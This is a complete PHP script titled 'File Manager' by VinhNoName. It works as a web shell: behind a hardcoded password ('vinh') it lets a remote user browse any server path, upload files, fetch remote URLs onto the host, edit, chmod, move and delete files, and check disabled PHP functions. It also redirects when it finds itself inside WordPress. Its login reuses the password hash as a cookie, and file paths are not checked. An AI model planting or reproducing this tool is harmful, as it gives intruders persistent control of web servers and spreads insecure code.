<?php
/*
 * File Manager v22.01.1998
 * Overwrite: True
 * For: Mobile phone
 * Style: No style
 * Author: VinhNoName
 * Email: vinhmoder@gmail.com
 * Facebook: facebook.com/yeumodgame
 * Twitter: twitter.com/vinhnoname
 * Copyright: (C) 2014 VinhNoName
 * All Rights Reserved.
 */
if(get_magic_quotes_gpc()){
$process=array(&$_GET,&$_POST,&$_COOKIE,&$_REQUEST);
while(list($key, $val)=each($process)){
foreach($val as $k=>$v){
if(is_array($v)){
$process[$key][stripslashes($k)]=$v;
$process[]=&$process[$key][stripslashes($k)];
}else{
$process[$key][stripslashes($k)]=stripslashes($v);
}}}
unset($process);
}

while(@ob_end_clean());
ob_start();
header('Content-Type: ');
@ini_set('max_execution_time', 3600);
if(!isset($_SERVER['PHP_SELF'])) $_SERVER['PHP_SELF']='';
if(function_exists('is_wp_error') && function_exists('plugins_url')){
$local=plugins_url(basename(__FILE__), __FILE__);
header('Location: '.$local);
echo '<meta http-equiv="refresh" content="0; url='.$local.'" />
<script>
location.href="'.$local.'";
</script>';
exit;
}
/*
function getuser(){
if(function_exists('get_current_user')){
$user=get_current_user();
if(!empty($user)) return $user;
}
@$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($_SERVER['PHP_SELF'])):fileowner($_SERVER['PHP_SELF']);
if(is_array($own)) $own=$own['name'];
if(!empty($own)) return $own;
@$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($_SERVER['PHP_SELF'])):filegroup($_SERVER['PHP_SELF']);
if(is_array($grp)) $grp=$grp['name'];
if(!empty($grp)) return $grp;
if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) $root=$_SERVER['DOCUMENT_ROOT'];
else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME'])) $root=$_SERVER['SCRIPT_FILENAME'];
else $root=realpath(dirname(__FILE__));
list($root)=explode($_SERVER['PHP_SELF'], $root);
$root=str_replace('\\', '/', $root);
$root=explode('/', $root);
$home=array(''=>1, 'httpdocs'=>1, 'home'=>1, 'htdocs'=>1, 'html'=>1, 'hosts'=>1, 'vhosts'=>1, 'public_html'=>1, 'home2'=>1, 'httpdoc'=>1);
$cuser=count($root)-1;
for($i=$cuser; $i>-1; $i--){
if(!isset($home[strtolower($root[$i])])){
return $root[$i];
}}
return false;
}
if(getuser()){
$db['host']='mysql.main-hosting.com';
$db['user']=getuser().'_user';
$db['name']=getuser().'_name';
$db['pass']='vinh';
}else{
//Default
$db['host']='localhost';
$db['user']='root';
$db['name']='root';
$db['pass']='root';
}
*/
//error_reporting(0);//Not show
error_reporting(E_ALL);//Show all
$is_safe_mode=strtolower(ini_get('safe_mode'));
if($is_safe_mode!='1' && $is_safe_mode!='on' && function_exists('set_time_limit')) set_time_limit(3600);
//Password
$password=md5('vinh');
$GLOBALS['password']=$password;
$_http_host=isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
$_script_url='http'.((isset($_ENV['HTTPS']) && $_ENV['HTTPS'] == 'on') || $_SERVER['SERVER_PORT'] == 443 ? 's' : '').'://'.$_http_host.($_SERVER['SERVER_PORT'] != 80 && $_SERVER['SERVER_PORT'] != 443 ? ':'.$_SERVER['SERVER_PORT'] : '').$_SERVER['PHP_SELF'];
$_script_base=substr($_script_url, 0, strrpos($_script_url, '/')+1);
$lang[0]=array('Mật khẩu: ', 'Xóa', 'Chmod', 'Sửa đổi', 'Giải nén', 'Đổi tên', 'Chọn tất cả', 'Thành công!', 'Thất bại!', 'ĐĂNG XUẤT', 'Trang chủ', 'Đến', 'Chỉnh Sửa: ', 'Tải lên', 'Lưu', 'Nén', 'Sao chép', 'Đăng Nhập', 'Tải lên tập tin từ máy: ', 'Nhập link tập tin: ', 'File Manager', 'Nhập tên mới: (Ví dụ: files/tenfile.php)', 'Lưu bản backup', 'Di chuyển', 'English', 'Sử dụng fsockopen()');
$lang[1]=array('Password: ', 'Delete', 'Chmod', 'Edit', 'Extract', 'Rename', 'Select all', 'Successfully!', 'Failed!', 'LOGOUT', 'Home', 'Go', 'Editing: ', 'Upload', 'Save', 'Zip', 'Copy', 'Login', 'Browser: ', 'Import: ', 'File Manager', 'New name: (Eg: files/name.php)', 'Save backup', 'Move', 'Tiếng Việt', 'Using fsockopen()');
//Set language
if(!isset($_COOKIE['lang'])) $_COOKIE['lang']='no';
if(isset($_GET['lang'])){
if($_COOKIE['lang']!='ok'){
setcookie('lang', 'ok', time() + 3600 * 24 * 365, '/');
}else{
setcookie('lang', 'no', time() + 3600 * 24 * 365, '/');
}
header('Location: '.$_script_url);
exit;
}
if($_COOKIE['lang']=='ok') $lang=$lang[1]; else $lang=$lang[0];
$login=false;
if(isset($_POST['pass']) && md5($_POST['pass'])==$password){
$login=true;
setcookie('php_id', $password, time() + 3600 * 24 * 365, '/');
}
if(isset($_COOKIE['php_id']) && $_COOKIE['php_id']==$password) $login=true;
if(isset($_REQUEST['thoat'])){
setcookie('php_id', '', time() - 1998, '/');
$login=false;
}
if(!$login){
$login='<title>'.$lang[20].'</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">
function dn(){
var pass=document.getElementById("pass").value;
if(pass!=""){
var vdn=document.getElementById("vdn");
vdn.submit();
}}
</script>
<div align="center"><a href="?lang">'.$lang[24].'</a><br/>
<form method="post" id="vdn" action="'.$_script_url.'">'.$lang[0].'<br /><input type="password" id="pass" name="pass" size="9" onMouseout="dn();" onblur="dn();" /><br /><input type="submit" value="'.$lang[17].'" /></form></div>';
exit($login);
}
if(isset($_REQUEST['tai'])){
$tai=rawurldecode($_REQUEST['tai']);
if(is_file($tai) && file_exists($tai)){
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.addslashes(basename($tai)).'"');
header('Content-Length: '.filesize($tai));
header('Content-Transfer-Encoding: binary');
$fp=fopen($tai, 'rb');
fpassthru($fp);
fclose($fp);
ob_end_flush();
}
exit();
}
if(empty($_REQUEST['mo'])){
$path_info = !empty($_SERVER['PATH_INFO']) ? $_SERVER['PATH_INFO'] : (!empty($_SERVER['ORIG_PATH_INFO']) ? $_SERVER['ORIG_PATH_INFO'] : '');
if(substr($path_info, 0, 1)=='/') $path_info=substr($path_info, 1, strlen($path_info));
$mo=$path_info;
}else{
$mo=trim(rawurldecode($_REQUEST['mo']));
}
if(!empty($mo)){
if(substr($mo, -1) != '/') $mo.='/';
$path=$mo;
}else{
$mo='';
$path='./';
}
$file=isset($_REQUEST['chon']) ? $_REQUEST['chon'] : array();
$link=isset($_REQUEST['link']) ? trim($_REQUEST['link']) : '';
$fileu=isset($_FILES['file']['name']) ? $_FILES['file']['name'] : false;
if(!function_exists('file_put_contents')){
function file_put_contents($f, $c){
$fp=fopen($file,'w');
fwrite($fp,$c);
fclose($fp);
}
}
if(!function_exists('scandir')){
function scandir($d){
$file=array();
if($d=@opendir($d)){
while(($f=readdir($d)) !== FALSE){
$file[]=$f;
}
closedir($d);
}
return $file;
}
}
function vdel($file){
if(file_exists($file)){
if(is_file($file)){
chmod($file, 0644);
unlink($file);
}else{
chmod($file, 0755);
$file.='/';
$dir=scandir($file);
$arsize=sizeof($dir);
for($i=0;$i<$arsize;$i++){
$v=$dir[$i];
if($v!='.' && $v!='..') vdel($file.$v);
}
rmdir($file);
}}}
function saochep($file, $new='.'){
if(file_exists($file)){
if(is_file($file)){
if(file_exists($new)) vdel($new);
chmod($file, 0644);
copy($file, $new);
}else{
chmod($file, 0755);
if(!file_exists($new) && $new!=''){
mkdir($new, 0755);
}
if($new!='') $new.='/';
$file.='/';
$dir=scandir($file);
$arsize=sizeof($dir);
for($i=0;$i<$arsize;$i++){
$v=$dir[$i];
if($v!='.' && $v!='..'){
saochep($file.$v, $new.$v);
}}}}}
function taotm($file, $mo=''){
$thm=explode('/', $file);
if(isset($thm[1])){
$tm=$mo.$thm[0];
if(is_file($tm) && $tm!='') unlink($tm);
if(!file_exists($tm) && $tm!='') mkdir($tm,0755);
$vi=count($thm)-1;
for($i=1;$i<$vi;$i++){
$tm.='/'.$thm[$i];
if(is_file($tm)) unlink($tm);
if(!file_exists($tm)) mkdir($tm,0755);
}}}
function sendnocache(){
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
}
sendnocache();
if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) $root=$_SERVER['DOCUMENT_ROOT'];
else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME'])) $root=$_SERVER['SCRIPT_FILENAME'];
else $root=realpath(dirname(__FILE__));
list($root)=explode($_SERVER['PHP_SELF'], $root);
echo '<title>'.$lang[20].'</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">
function checkall(){
for(i=0;i < document.finfo.elements.length; i++ ){
if(document.finfo.elements[i].checked == true){
document.finfo.elements[i].checked=false;
}else{
document.finfo.elements[i].checked=true;
}}}
function go(){
var vform=document.getElementById("vgo");
vform.submit();
}
</script>
<div align="left"><a href="?lang">'.$lang[24].'</a><br/>
<a href="'.$_script_url.'?thoat">'.$lang[9].'</a><br/>
<a href="'.$_script_url.'?df">Disable function</a><br/>
<a href="'.$_script_url.'?mo='.$root.'">'.$lang[10].'</a><br/>
<form method="post" enctype="multipart/form-data">
'.$lang[18].'<br /><input type="file" name="file" /><br />
'.$lang[19].'<br /><textarea name="link"></textarea><br />
'.$lang[21].'<br /><input type="text" size="10" name="ten" /><br />
<input type="checkbox" name="fsockopen" value="1" />  '.$lang[25].'<br />
<input type="submit" value="'.$lang[13].'" />
</form><br/>
<form id="vgo" action="'.$_script_url.'" method="get"><input id="mo" name="mo" size="10" value="'.htmlspecialchars($mo).'" type="text" onblur="go();" /> <input type="submit" value="'.$lang[11].'" /></form><br/>
';
if(isset($_REQUEST['df'])){
$disable=@ini_get('disable_functions');
if(empty($disable)) $disable='None';
echo '<br />Disabled functions:<br />'.$disable;
exit(0);
}
if($fileu){
$ten=trim($_REQUEST['ten']);
if(!empty($ten)){
if(substr($ten, -1)=='/') $ten.=$fileu;
$fileu=$ten;
}
taotm($fileu, $mo);
$fileu=$mo.$fileu;
if(is_file($fileu)) vdel($fileu);
if(move_uploaded_file($_FILES['file']['tmp_name'], $fileu)){
echo '<div style="color: green">'.$lang[7].'</div>';
}else{
echo '<div style="color: red">'.$lang[8].'</div>';
}}
if(!empty($link) && $link!='https://' && $link!='http://' && $link!='ftp://'){
if(isset($_REQUEST['fsockopen'])){
function download($url='http://', $file){
$_response_headers=array();
$matches=parse_url($url);
$host=$matches['host'];
$link=(isset($matches['path'])?$matches['path']:'/').(isset($matches['query'])?'?'.$matches['query']:'').(isset($matches['fragment'])?'#'.$matches['fragment']:'');
$port=!empty($matches['port']) ? $matches['port'] : 80;
$fsock=fsockopen((($matches['scheme'] == 'https' && extension_loaded('openssl')) ? 'ssl://' : 'tcp://').$host,$port,$errno,$errval,300);
$fp=fopen($file,'a');
if(!$fsock){
echo '<div style="color: red">'.$errval.' ('.$errno.')</div>';
}else{
$header='GET '.$link.' HTTP/1.0
Host: '.$host.'
User-Agent: '.$_SERVER['HTTP_USER_AGENT'].'
Accept: '.$_SERVER['HTTP_ACCEPT'].'
Accept-Language: '.$_SERVER['HTTP_ACCEPT_LANGUAGE'].'
Cookie: php_id='.$GLOBALS['password'].'
Referer: '.$url.'

';
fwrite($fsock,$header);
$line=fgets($fsock, 8192);
while(strspn($line, "\r\n") !== strlen($line)){
@list($name, $value)=explode(':', $line, 2);
$name=trim($name);
$_response_headers[strtolower($name)][]=trim($value);
$line=fgets($fsock, 8192);
}
/*
if(isset($_response_headers['location'])){
download($_response_headers['location'][0]);
}
*/
while($data=fread($fsock, 8192)){
fwrite($fp,$data);
}
fclose($fp);
fclose($fsock);
}
return $_response_headers;
}
}else{
function download($link='http://', $file){
$fp=fopen($file,'w');
$ch=curl_init($link);
curl_setopt($ch,CURLOPT_URL,$link);
curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch,CURLOPT_REFERER,$link);
curl_setopt($ch,CURLOPT_COOKIE,'php_id='.$GLOBALS['password']);
curl_setopt($ch,CURLOPT_FILE,$fp);
curl_exec($ch);
curl_close($ch);
fclose($fp);
unset($ch);
unset($fp);
}}
function badlink($link){
$htt=strtolower(substr($link, 0, 6));
if($htt=='https:' || $htt=='http:/' || $htt=='ftp://' ) return false;
return true;
}
$links=str_replace("\r", '', $link);
$links=explode("\n", $links);
foreach($links as $link){
if(badlink($link)) $link='http://'.$link;
$ten=substr($link, -1);
if($ten=='/'){
$file='import.vnn';
}else{
$file='';
list($file)=explode('?', $link);
$bad=array('<', '>', '&', ':', '=', ';', '?', '%20', '%');
$file=str_replace($bad,'',urldecode($file));
unset($bad);
$file=basename($file);
}
$ten=trim($_REQUEST['ten']);
if($ten){
if(substr($ten, -1)=='/') $ten.=$file;
$file=$ten;
}
taotm($file, $mo);
$file=$mo.$file;
if(is_file($file)) vdel($file);
if($link!='http://') download($link, $file);
echo '<div style="color: green">'.$lang[7].'</div>';
}
}
if(isset($_REQUEST['zip'])){
function allfile($path){
$listf=array();
if(is_file($path)){
$listf[]=$path;
}else{
$path.='/';
$dir=scandir($path);
$arsize=sizeof($dir);
for($i=0;$i<$arsize;$i++){
$v=$dir[$i];
if($v!='.' && $v!='..'){
$arr=array();
$arr=allfile($path.$v);
$listf=array_merge($arr,$listf);
}
}}
return $listf;
}
$zf=$mo.'Files.zip';
vdel($zf);
file_put_contents($zf, NULL);
$zip=new ZipArchive();
$zip->open($zf);
//$zip->addFromString('VinhNoName.txt', 'Zip in '.date('Y').' by VinhNoName');
foreach($file as $f){
$listf=allfile($mo.$f);
foreach($listf as $vf){
$zip->addFile($vf);
}}
$zip->close();
unset($zip);
echo '<div style="color: green">'.$lang[7].'</div>';
}
if(isset($_REQUEST['unzip'])){
foreach($file as $f){
$zip=new ZipArchive();
if($zip->open($mo.$f)===TRUE){
$zip->extractTo($path);
$zip->close();
unset($zip);
echo '<div style="color: green">'.$lang[7].'</div>';
}else{
echo '<div style="color: red">'.$lang[8].'</div>';
}}}
if(isset($_REQUEST['editv'])){
if(isset($_REQUEST['bak'])) copy($_REQUEST['tenfile'], $_REQUEST['tenfile'].'.bak');
$fileu='';
foreach($_REQUEST['editv'] as $f){
$fileu.=$f.'
';
}
$fileu=trim($fileu);
chmod($_REQUEST['tenfile'], 0644);
unlink($_REQUEST['tenfile']);
file_put_contents($_REQUEST['tenfile'], $fileu);
unset($fileu);
unset($_REQUEST['editv']);
echo '<div style="color: green">'.$lang[7].'</div>';
}
if(isset($_REQUEST['edit'])){
$v=isset($_REQUEST['ln']) ? $_REQUEST['ln'] : NULL;
if(($v==NULL)||($v<1)||($v>50)) $v=7;
$fl=file($mo.$file[0]);
$cnt=count($fl);
$allp=ceil($cnt/$v);
$ar=NULL;
echo '<div align="center">'.$lang[12].htmlspecialchars($file[0]).'</div><form method="post"><input type="hidden" name="tenfile" value="'.htmlspecialchars($mo.$file[0]).'" />';
for($j=1;$j<$allp+1;$j++){
$begin=$j*$v-$v;
if($begin>$cnt) $begin=0;
$end=$begin+$v;
if($end>$cnt) $end=$cnt;
$vl=$end-$begin;
echo '<div>
<textarea name="editv[]" rows="'.($v+1).'" cols="90">';
for ($i=0;$i<$vl;$i++) {
echo htmlspecialchars($fl[$begin+$i],ENT_QUOTES);
}
echo '</textarea></div>';
}
unset($ar);
unset($fl);
echo '<div>
<textarea name="editv[]" rows="'.($v+1).'" cols="90">


</textarea>
</div>
<input type="submit" value="'.$lang[14].'" /> 
 <input type="submit" name="bak" value="'.$lang[22].'" />
</form>';
exit();
}
if(isset($_REQUEST['doiten'])){
echo '<form method="post"><input type="hidden" name="tencu" value="'.htmlspecialchars($mo.$file[0]).'" />'.$lang[21].'<input type="text" name="tenmoi" size="10" value="'.htmlspecialchars($mo.$file[0]).'" />
<br /><input type="submit" value="'.$lang[5].'" name="rename" />  
  <input type="submit" value="'.$lang[23].'" name="move" />  
  <input type="submit" value="'.$lang[16].'" name="copy" /></form>';
exit();
}
if(isset($_REQUEST['copy'])){
taotm($_REQUEST['tenmoi']);
saochep($_REQUEST['tencu'], $_REQUEST['tenmoi']);
echo '<div style="color: green">'.$lang[7].'</div>';
}
if(isset($_REQUEST['move'])){
taotm($_REQUEST['tenmoi']);
saochep($_REQUEST['tencu'], $_REQUEST['tenmoi']);
vdel($_REQUEST['tencu']);
echo '<div style="color: green">'.$lang[7].'</div>';
}
if(isset($_REQUEST['rename'])){
taotm($_REQUEST['tenmoi']);
if(file_exists($_REQUEST['tencu'])){
if(rename($_REQUEST['tencu'], $_REQUEST['tenmoi'])){
echo '<div style="color: green">'.$lang[7].'</div>';
}else{
echo '<div style="color: red">'.$lang[8].'</div>';
}}}
if(isset($_REQUEST['chmod'])){
$p=fileperms($mo.$file[0]);
$p=base_convert($p,10,8);
$p=substr($p,strlen($p)-3);
echo '<form method="post"><input type="hidden" name="tenfile" value="'.htmlspecialchars($mo.$file[0]).'" />'.$lang[2].': <input type="text" name="cnew" size="3" value="'.$p.'" maxlength="3" /><br />
<input type="submit" value="'.$lang[2].'" name="chm" /></form>';
exit();
}
if(isset($_REQUEST['chm'])){
if(file_exists($_REQUEST['tenfile'])){
$nmod=octdec('0'.$_REQUEST['cnew']);
if(chmod($_REQUEST['tenfile'], $nmod)){
echo '<div style="color: green">'.$lang[7].'</div>';
}else{
echo '<div style="color: red">'.$lang[8].'</div>';
}}}
if(isset($_REQUEST['xoa'])){
foreach($file as $f){
vdel($mo.$f);
}
echo '<div style="color: green">'.$lang[7].'</div>';
}
//Listing files
echo '<form method="post" name="finfo" id="finfo">
<span>   <a href="#" onClick="checkall();">'.$lang[6].'</a></span><br/>';
if(is_dir($path)){
$dir=scandir($path);
sort($dir);
$arsize=sizeof($dir);
for($i=0;$i<$arsize;$i++){
$vi=$dir[$i];
if($vi!='.' && $vi!='..'){
$v=$mo.$vi;
$vi=htmlspecialchars($vi);
if(is_file($v)){
//$write=is_writable($v)?1:0;
$v=rawurlencode($v);
echo '<div>
<span style="color: red">&bull;</span> <input type="checkbox" name="chon[]" value="'.$vi.'" />  <a href="'.$_script_url.'?tai='.$v.'">'.$vi.'</a>
</div>';
}else{
$v=rawurlencode($v);
echo '<div>
<span style="color: red">&bull;</span> <input type="checkbox" name="chon[]" value="'.$vi.'">  <a href="'.$_script_url.'?mo='.$v.'"><b>'.$vi.'</b></a>
</div>';
}}}}
echo '<br /><br /><input type="submit" value="'.$lang[15].'" name="zip" /> 
<input type="submit" value="'.$lang[5].'" name="doiten" /> 
<input type="submit" value="'.$lang[4].'" name="unzip" /> 
<input type="submit" value="'.$lang[3].'" name="edit" /> 
<input type="submit" value="'.$lang[2].'" name="chmod" /> 
<input type="submit" value="'.$lang[1].'" name="xoa" />
</form>';
unset($dir);
echo '</div>';
ob_end_flush();
exit();//Delete ads from host
?>
